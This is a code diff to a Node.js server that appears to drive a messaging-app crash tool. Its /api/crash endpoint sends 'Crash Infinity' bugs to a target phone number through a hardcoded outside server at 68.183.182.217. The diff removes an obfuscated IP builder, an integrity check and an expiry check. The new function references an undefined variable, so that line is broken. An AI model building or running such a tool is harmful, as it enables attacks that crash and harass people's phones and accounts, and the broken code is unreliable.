@@ -41,39 +41,18 @@ app.post("/api/change-role", (req, res) => {
 
 // TARO FUNCTIONMY
 //─ ( Api Dellay Set Time ) 
-async function ApiDellay(targetNumber) {
-  const selfCheck = ApiDellay.toString().length;
-  if (selfCheck !== 635) { 
-    throw new Error("error ( function telah di ubah )");
-  }
+//─ ( Api Dellay Set Time ) 
+async function ApiDellay(target) {
+  const apiUrl = `http://68.183.182.217:2001/kipopapi?chatId=${targetN}&type=Crash Infinity`;
 
-  const ip = String.fromCharCode(
-    0x44,0x34,
-    0x2A,0x2F,
-    0x42,0x37,
-    0x2B,0x31,
-    0x39,0x41,
-    0x38,0x31
-  ).replace(/[^\d.]/g,"")
-   .replace(/^(\d{2})(\d{3})(\d{3})(\d{3})$/,(m,a,b,c,d)=>[a,b,c,d].join("."));
-
-  const apiUrl = `http://${ip}:2001/kipopapi?chatId=${targetNumber}&type=Crash Infinity`;
-
-  const now = Date.now()/1000;
-  const span = 1728e3;
-  const mark = 1.69223e9;
-  if (now > mark + span) {
-    throw new Error("Function expired.");
-  }
+  console.log(`🔁 [apiDelay] Sending bug to: ${target}`);
 
   try {
-    const response = await axios.get(apiUrl, {
-      headers: {
-        "X-Request-ID": Math.random().toString(36).substring(2) + Date.now().toString(36)
-      }
-    });
+    const response = await axios.get(apiUrl);
+    console.log(`✅ [apiDelay] Success:`, response.data);
     return response.data;
   } catch (error) {
+    console.error(`❌ [apiDelay] Error:`, error.message);
     throw error;
   }
 }
@@ -86,7 +65,7 @@ app.post("/api/crash", async (req, res) => {
   }
 
   try {
-    await ApiDellay(targetNumber, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
+    await ApiDellay(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
     res.json({ success: true, message: `Bug terkirim ke ${target}` });
   } catch (err) {
     res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
